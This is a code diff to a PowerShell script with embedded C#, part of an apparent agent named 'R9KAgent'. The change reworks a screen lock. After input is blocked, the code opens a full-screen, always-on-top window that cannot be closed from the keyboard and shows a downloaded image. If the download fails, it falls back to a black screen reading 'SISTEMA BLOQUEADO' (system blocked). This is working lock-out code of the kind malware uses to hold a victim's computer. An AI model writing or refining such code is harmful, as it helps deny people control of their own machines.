@@ -175,23 +175,34 @@ if (-not ("R9KAgent" -as [type])) {
                     BlockInput(true);
                     bannerThread = new Thread(() => {
                         try {
-                            using (var wc = new WebClient()) {
-                                // IMAGEM ATUALIZADA AQUI
-                                byte[] imgBytes = wc.DownloadData("https://i.imgur.com/gx1MwjP.jpeg");
-                                using (MemoryStream ms = new MemoryStream(imgBytes)) {
-                                    Image bgImg = Image.FromStream(ms);
-                                    bannerForm = new Form();
-                                    bannerForm.FormBorderStyle = FormBorderStyle.None;
-                                    bannerForm.WindowState = FormWindowState.Maximized;
-                                    bannerForm.TopMost = true;
-                                    bannerForm.ShowInTaskbar = false;
-                                    bannerForm.BackgroundImage = bgImg;
-                                    bannerForm.BackgroundImageLayout = ImageLayout.Stretch;
-                                    bannerForm.KeyPreview = true;
-                                    bannerForm.KeyDown += (s, e) => { e.SuppressKeyPress = true; };
-                                    Application.Run(bannerForm);
+                            Image bgImg = null;
+                            try {
+                                using (var wc = new WebClient()) {
+                                    wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36");
+                                    byte[] imgBytes = wc.DownloadData("https://i.imgur.com/gx1MwjP.jpeg");
+                                    using (MemoryStream ms = new MemoryStream(imgBytes)) {
+                                        bgImg = Image.FromStream(ms);
+                                    }
                                 }
+                            } catch {} // Se falhar o download, segue sem imagem
+
+                            bannerForm = new Form();
+                            bannerForm.FormBorderStyle = FormBorderStyle.None;
+                            bannerForm.WindowState = FormWindowState.Maximized;
+                            bannerForm.TopMost = true;
+                            bannerForm.ShowInTaskbar = false;
+                            bannerForm.BackColor = Color.Black; // Fundo preto caso a imagem falhe
+                            
+                            if (bgImg != null) {
+                                bannerForm.BackgroundImage = bgImg;
+                                bannerForm.BackgroundImageLayout = ImageLayout.Stretch;
+                            } else {
+                                bannerForm.Controls.Add(new Label { Text = "SISTEMA BLOQUEADO", ForeColor = Color.Red, Font = new Font("Arial", 48), Dock = DockStyle.Fill, TextAlign = ContentAlignment.MiddleCenter });
                             }
+                            
+                            bannerForm.KeyPreview = true;
+                            bannerForm.KeyDown += (s, e) => { e.SuppressKeyPress = true; };
+                            Application.Run(bannerForm);
                         } catch {}
                     });
                     bannerThread.SetApartmentState(ApartmentState.STA);
